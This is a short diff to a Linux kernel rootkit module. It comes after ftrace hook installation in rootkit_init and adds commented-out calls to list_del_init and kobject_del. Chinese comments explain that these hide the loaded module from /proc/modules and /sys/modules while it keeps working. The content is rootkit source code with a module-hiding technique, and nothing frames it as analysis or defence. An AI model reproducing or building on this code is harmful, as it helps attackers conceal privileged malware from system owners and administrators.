@@ -53,6 +53,11 @@ static int __init rootkit_init(void)
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if(err)
 		return err;
+	// 摘除链表，/proc/modules 中不可见。
+	//list_del_init(&THIS_MODULE->list);
+	// 摘除kobj，/sys/modules/中不可见。
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
+	// 摘除两处之后仍能发挥作用
 
 	printk(KERN_INFO "rootkit: Loaded >:-)\n");
 
